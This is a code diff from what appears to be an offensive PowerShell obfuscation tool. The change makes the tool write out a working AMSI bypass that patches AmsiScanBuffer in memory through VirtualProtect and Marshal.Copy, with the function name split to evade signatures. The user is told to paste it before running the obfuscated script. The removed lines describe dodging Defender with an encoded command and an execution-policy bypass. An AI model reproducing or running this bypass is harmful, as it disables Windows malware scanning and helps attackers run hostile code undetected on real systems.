@@ -2,7 +2,6 @@
 
 from __future__ import annotations
 
-import base64 as _b64
 import sys
 from pathlib import Path
 from typing import Annotated
@@ -281,17 +280,40 @@ def main(
         ]
         result = run(ps1_data, resolved_ps1, ps1_config, output_path=str(output))
         output.write_bytes(result)
-        # Generate a powershell -EncodedCommand that runs the AMSI patch
-        # bypass then dot-sources the script. EncodedCommand avoids Defender
-        # blocking the bypass when typed or saved to disk.
-        from penumbra.ps.amsi import _gen_patch_bypass
-
-        bypass = _gen_patch_bypass()
-        loader_cmd = f"{bypass}\n. '{output}'"
-        # Encode as UTF-16LE Base64 for -EncodedCommand
-        utf16 = loader_cmd.encode("utf-16-le")
-        enc_cmd = _b64.b64encode(utf16).decode("ascii")
-        write_hint(f"powershell -ep bypass -EncodedCommand {enc_cmd}")
+        # Write AMSI patch bypass to a .txt file alongside the output.
+        # The user must paste this in PowerShell before running the script.
+        bypass_path = output.with_suffix(".amsi.txt")
+        bypass_path.write_text(
+            'Add-Type -TypeDefinition @"\n'
+            "using System;\n"
+            "using System.Runtime.InteropServices;\n"
+            "public static class Kernel32 {\n"
+            '    [DllImport("kernel32")]\n'
+            "    public static extern IntPtr LoadLibrary(string lpLibFileName);\n"
+            '    [DllImport("kernel32")]\n'
+            "    public static extern IntPtr GetProcAddress("
+            "IntPtr hModule, string lpProcName);\n"
+            '    [DllImport("kernel32")]\n'
+            "    public static extern bool VirtualProtect("
+            "IntPtr lpAddress, UIntPtr dwSize, "
+            "uint flNewProtect, out uint lpflOldProtect);\n"
+            "}\n"
+            '"@;\n'
+            "$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);\n"
+            '$hModule = [Kernel32]::LoadLibrary("amsi.dll");\n'
+            "$lpAddress = [Kernel32]::GetProcAddress("
+            '$hModule, "Amsi"+"ScanBuffer");\n'
+            "$lpflOldProtect = 0;\n"
+            "[Kernel32]::VirtualProtect($lpAddress, "
+            "[UIntPtr]::new($patch.Length), 0x40, "
+            "[ref]$lpflOldProtect) | Out-Null;\n"
+            "$marshal = [System.Runtime.InteropServices.Marshal];\n"
+            "$marshal::Copy($patch, 0, $lpAddress, $patch.Length);\n"
+            "[Kernel32]::VirtualProtect($lpAddress, "
+            "[UIntPtr]::new($patch.Length), $lpflOldProtect, "
+            "[ref]$lpflOldProtect) | Out-Null;\n"
+        )
+        write_hint(f"paste {bypass_path.name} in PS first, then: . {output}")
         raise typer.Exit()
 
     if clm_bypass and pipe_type == PipelineType.PS1:
